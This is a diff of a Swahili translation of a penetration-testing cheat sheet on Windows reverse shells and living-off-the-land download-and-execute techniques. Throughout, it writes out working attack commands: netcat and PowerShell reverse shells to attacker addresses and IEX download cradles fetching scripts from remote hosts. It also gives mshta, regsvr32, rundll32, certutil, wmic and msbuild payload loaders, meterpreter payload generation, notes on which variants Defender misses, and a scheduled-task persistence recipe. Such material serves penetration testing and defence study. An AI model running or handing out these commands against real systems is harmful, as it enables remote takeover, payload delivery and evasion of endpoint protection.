@@ -4,8 +4,8 @@
 
 ## Lolbas
 
-The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) is for linux.\
-Kwa wazi, **there aren't SUID files or sudo privileges in Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binaries** zinaweza kutumiwa (au kutumika kinyemela) kufanya aina fulani ya vitendo visivyotarajiwa kama **execute arbitrary code.**
+Ukurasa wa [lolbas-project.github.io](https://lolbas-project.github.io/) ni wa Windows kama vile [https://gtfobins.github.io/](https://gtfobins.github.io/) ulivyo wa linux.\
+Ni wazi, **hakuna faili za SUID au privileges za sudo katika Windows**, lakini ni muhimu kujua **jinsi** baadhi ya **binaries** zinavyoweza kutumiwa (vibaya) kutekeleza vitendo visivyotarajiwa kama vile **execute arbitrary code.**
 
 ## NC
 ```bash
@@ -13,7 +13,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## NCAT
 
-madhulumiwa
+mwathiriwa
 ```
 ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
 #Encryption to bypass firewall
@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat unaobebeka na salama**. Inafanya kazi kwenye mifumo zinazofanana na Unix na Win32. Ikiwa na vipengele kama usimbaji imara, kuendesha programu, bandari za chanzo zinazoweza kubadilishwa, na kuunganishwa upya kwa kuendelea, sbd hutoa suluhisho la kubadilika kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka kwa usambazaji wa Kali Linux linaweza kutumika kama mbadala wa kuaminika kwa Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) ni mbadala wa Netcat unaoweza kubebeka na salama**. Inafanya kazi kwenye mifumo inayofanana na Unix na Win32. Ikiwa na vipengele kama encryption imara, utekelezaji wa programu, source ports zinazoweza kubinafsishwa, na kuunganisha tena mfululizo, sbd hutoa suluhisho lenye matumizi mbalimbali kwa mawasiliano ya TCP/IP. Kwa watumiaji wa Windows, toleo la sbd.exe kutoka kwenye usambazaji wa Kali Linux linaweza kutumika kama mbadala unaotegemeka wa Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -60,13 +60,13 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## OpenSSH
 
-Attacker (Kali)
+Mshambuliaji (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Mwanaathiri
+Mwathiriwa
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -81,23 +81,23 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Mchakato unaofanya wito wa mtandao: **powershell.exe**\
-Payload imeandikwa kwenye diski: **NO** (_angalau hakuna sehemu niliyoweza kuipata nikipitia procmon !_)
+Process inayotekeleza network call: **powershell.exe**\
+Payload iliyoandikwa kwenye diski: **HAPANA** (_angalau hakuna mahali nilipoweza kupata kwa kutumia procmon !_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Mchakato unaofanya wito wa mtandao: **svchost.exe**\
-Payload imeandikwa kwenye diski: **WebDAV client local cache**
+Mchakato unaotekeleza ombi la mtandao: **svchost.exe**\
+Payload iliyoandikwa kwenye diski: **WebDAV client local cache**
 
 **Mstari mmoja:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Pata maelezo zaidi kuhusu Powershell Shells mbalimbali mwishoni mwa hati hii**
+**Pata maelezo zaidi kuhusu Powershell Shells tofauti mwishoni mwa hati hii**
 
 ## Mshta
 
-- [Tazama hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -109,15 +109,15 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Mfano wa hta-psh reverse shell (tumia hta ili kupakua na kutekeleza PS backdoor)**
+#### **Mfano wa hta-psh reverse shell (tumia hta kupakua na kutekeleza PS backdoor)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Unaweza kupakua na kutekeleza kwa urahisi Koadic zombie ukitumia stager hta**
+**Unaweza kupakua na kutekeleza zombie ya Koadic kwa urahisi sana ukitumia stager hta**<sup>[[3]](#references)</sup>
 
 #### mfano wa hta
 
-[**Kutoka hapa**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+[**Kutoka hapa**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)<sup>[[7]](#references)</sup>
 ```xml
 <html>
 <head>
@@ -134,7 +134,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**Kutoka hapa**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Kutoka hapa**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -165,9 +165,9 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll hello world example**](https://github.com/carterjones/hello-world-dll)
+[**Mfano wa hello world wa Dll**](https://github.com/carterjones/hello-world-dll)
 
-- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -179,7 +179,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http
 
 **Rundll32 - sct**
 
-[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Kutoka hapa**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -211,7 +211,7 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -221,12 +221,12 @@ regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 **Imegunduliwa na defender**
 
-#### Regsvr32 – export ya DLL yoyote kwa argument /i (udhibiti wa ufikiaji & kudumu)
+#### Regsvr32 – export ya DLL kiholela yenye argument ya /i (gatekeeping na persistence)
 
-Mbali na kupakia scriptlets za mbali (`scrobj.dll`), `regsvr32.exe` itapakia DLL ya ndani na kuita exports zake `DllRegisterServer`/`DllUnregisterServer`. Custom loaders mara nyingi hutumia hili vibaya kutekeleza code yoyote huku zikijichanganya na LOLBin iliyosainiwa. Vidokezo viwili vya tradecraft vinavyotumika kwa uhalisia:
+Mbali na kupakia scriptlets za mbali (`scrobj.dll`), `regsvr32.exe` itapakia DLL ya ndani na kuita exports zake za `DllRegisterServer`/`DllUnregisterServer`. Custom loaders mara nyingi hutumia vibaya hii kutekeleza code kiholela huku wakijificha ndani ya LOLBin iliyosainiwa. Tradecraft notes mbili zilizoonekana in the wild:<sup>[[6]](#references)</sup>
 
-- Gatekeeping argument: DLL inatoka isipokuwa switch maalum ipitishwe kwa `/i:<arg>`, kwa mfano `/i:--type=renderer` ili kuiga watoto wa renderer wa Chromium. Hii inapunguza utekelezaji usiotarajiwa na kuvuruga sandboxes.
-- Persistence: panga `regsvr32` ili ikimbie DLL kwa mode mtulivu + ruhusa za juu na argument `/i` inayohitajika, ikijiweka kama updater task:
+- Hoja ya gatekeeping: DLL hutoka isipokuwa switch maalum ipitishwe kupitia `/i:<arg>`, kwa mfano `/i:--type=renderer` ili kuiga watoto wa Chromium renderer. Hii hupunguza execution isiyotarajiwa na kuvuruga sandboxes.
+- Persistence: panga `regsvr32` iendeshe DLL ikiwa na silent + high privileges na argument inayohitajika ya `/i`, ikijifanya kuwa updater task:
 ```powershell
 Register-ScheduledTask \
 -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
@@ -237,13 +237,13 @@ Register-ScheduledTask \
 -RunLevel Highest
 ```
 
-Tazama pia: variant ya ClickFix clipboard‑to‑PowerShell inayoseti JS loader kisha baadaye inadumu kwa `regsvr32`.
+Tazama pia: variant ya ClickFix clipboard-to-PowerShell inayoweka JS loader na baadaye kufanya persistence kwa `regsvr32`.
 {{#ref}}
 ../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
 {{#endref}}
 
 
-[**Kutoka hapa**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+[**Kuanzia hapa**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)<sup>[[9]](#references)</sup>
 ```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -269,21 +269,21 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Unaweza kupakua na kutekeleza kwa urahisi sana zombie wa Koadic kwa kutumia stager regsvr**
+**Unaweza kupakua na ku-execute Koadic zombie kwa urahisi sana ukitumia stager regsvr**<sup>[[3]](#references)</sup>
 
 ## Certutil
 
-- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 
-Pakua B64dll, uitafsiri kutoka Base64 (decode) na uitekeleze.
+Pakua B64dll, i-decode na i-execute.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Pakua B64exe, ibadilishe kutoka Base64 kisha uitekeleze.
+Pakua B64exe, ifanye decode na uiendeshe.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Imetambuliwa na Defender**
+**Imegunduliwa na defender**
 
 ## **Cscript/Wscript**
 ```bash
@@ -293,14 +293,14 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Imegunduliwa na defender**
+**Imegunduliwa na Defender**
 
 ## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Mchakato unaofanya mwito wa mtandao: **svchost.exe**\
-Payload imeandikwa kwenye diski: **WebDAV client local cache**
+Mchakato unaotekeleza mawasiliano ya mtandao: **svchost.exe**\
+Payload iliyoandikwa kwenye diski: **WebDAV client local cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -309,16 +309,16 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Imegunduliwa na mlinzi**
+**Imegunduliwa na defender**
 
 ## **MSIExec**
 
-Mshambuliaji
+Attacker
 ```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
-Mwenye kuathiriwa:
+Mhasiriwa:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
@@ -326,11 +326,11 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Mfano wa faili ya xsl [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Mfano wa faili ya xsl [hapa](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):<sup>[[10]](#references)</sup>
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -342,52 +342,52 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**Haikutambuliwa**
+**Haijatambuliwa**
 
-**Unaweza kupakua & kuendesha kwa urahisi sana Koadic zombie ukitumia stager wmic**
+**Unaweza kupakua na kutekeleza kwa urahisi sana Koadic zombie ukitumia stager wmic**<sup>[[3]](#references)</sup>
 
 ## Msbuild
 
-- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Unaweza kutumia mbinu hii kuvuka vikwazo vya Application Whitelisting na Powershell.exe. Utapata PS shell.\
-Shusha tu hii na uitekeleze: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Unaweza kutumia technique hii kukwepa Application Whitelisting na vizuizi vya Powershell.exe. Kwa kuwa utaonyeshwa PS shell.\
+Pakua hii tu na uiiendeshe: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
-**Haigunduliki**
+**Haijatambuliwa**
 
 ## **CSC**
 
-Kusanya msimbo wa C# kwenye kompyuta ya mwathiriwa.
+Kompili code ya C# kwenye mashine ya mwathiriwa.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Unaweza kupakua reverse shell ya msingi ya C# kutoka hapa: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Unaweza kupakua C# reverse shell ya msingi kutoka hapa: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Haijagunduliwa**
+**Haijatambuliwa**
 
 ## **Regasm/Regsvc**
 
-- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-**Sijawahi kujaribu**
+**Sijajaribu**
 
-[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
+[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)<sup>[[2]](#references)</sup>
 
 ## Odbcconf
 
-- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Kutoka hapa](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-**Sijajaribu**
+**Sijawahi kuijaribu**
 
-[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
+[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**]<sup>[[2]](#references)</sup>
 
 ## Powershell Shells
 
@@ -395,29 +395,29 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Katika folda ya **Shells**, kuna shell nyingi tofauti. Ili kupakua na kutekeleza Invoke-_PowerShellTcp.ps1_, tengeneza nakala ya script na uambatishie mwishoni wa faili:
+Katika folder ya **Shells**, kuna shells nyingi tofauti. Ili kupakua na kutekeleza Invoke-_PowerShellTcp.ps1_, tengeneza nakala ya script hiyo na uongeze mwishoni mwa file:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Anza kuhudumia script kwenye seva ya wavuti na uitekeleze kwa upande wa waathiriwa:
+Anza ku-host script kwenye web server na kuitekeleza upande wa victim:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender haikutambua kama msimbo hatari (bado, 3/04/2019).
+Defender haioni kuwa ni malicious code (bado, 3/04/2019).
 
-**TODO: Angalia nishang shells nyingine**
+**TODO: Check other nishang shells**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Pakua, anzisha web server, anzisha listener, na uitekeleze upande wa mwathiriwa:
+Download, anzisha web server, anzisha listener, na uitekeleze upande wa victim:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender haikutambui kama msimbo hatari (bado, 3/04/2019).
+Defender haiitambui kama code hasidi (bado, 3/04/2019).
 
-**Chaguzi nyingine zinazotolewa na powercat:**
+**Chaguo zingine zinazotolewa na powercat:**
 
 Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
@@ -440,17 +440,17 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Tengeneza powershell launcher, uiweke kwenye faili, kisha upakue na uitekeleze.
+Tengeneza powershell launcher, ihifadhi kwenye faili, kisha ipakue na kuitekeleza.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Imegunduliwa kama malicious code**
+**Imegunduliwa kuwa ni code hasidi**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Unda toleo la powershell la metasploit backdoor ukitumia unicorn
+Unda toleo la powershell la metasploit backdoor kwa kutumia unicorn.
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -458,27 +458,29 @@ Anzisha msfconsole kwa kutumia resource iliyoundwa:
 ```
 msfconsole -r unicorn.rc
 ```
-Anzisha web server ikihudumia faili _powershell_attack.txt_ na uendeshe kwenye mashine ya mwathirika:
+Anzisha web server inayohudumia faili _powershell_attack.txt_ na execute kwenye victim:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Imegunduliwa kama msimbo wa hatari**
+**Imegunduliwa kama msimbo hasidi**
 
 ## Zaidi
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) Konsoli ya PS yenye baadhi ya moduli za PS zinazotumika kushambulia zilizopakiwa awali (cyphered)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console yenye offensive PS modules zilizopakiwa awali (cyphered)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) Konsoli ya PS yenye baadhi ya moduli za PS zinazotumika kushambulia na proxy detection (IEX)
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS console yenye offensive PS modules na proxy detection (IEX)
 
-## Marejeo
+## Marejeleo
 
-- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
-- [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
-- [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
-- [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [Arno0x's GitHub Gists](https://gist.github.com/Arno0x)
+- [3] [Koadic – COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
+- [4] [Reverse Shell Cheatsheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [Windows Oneliners to Download Remote Payload and Execute Arbitrary Code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [6] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [7] [calc.hta – HTA reverse execution example (Arno0x gist)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+- [8] [scriptlet.sct – mshta/rundll32 scriptlet example (Arno0x gist)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+- [9] [regsvr32.sct – Regsvr32 scriptlet example (Arno0x gist)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+- [10] [wmic.xsl – WMIC XSL stylesheet example (Arno0x gist)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
 
 {{#include ../../banners/hacktricks-training.md}}
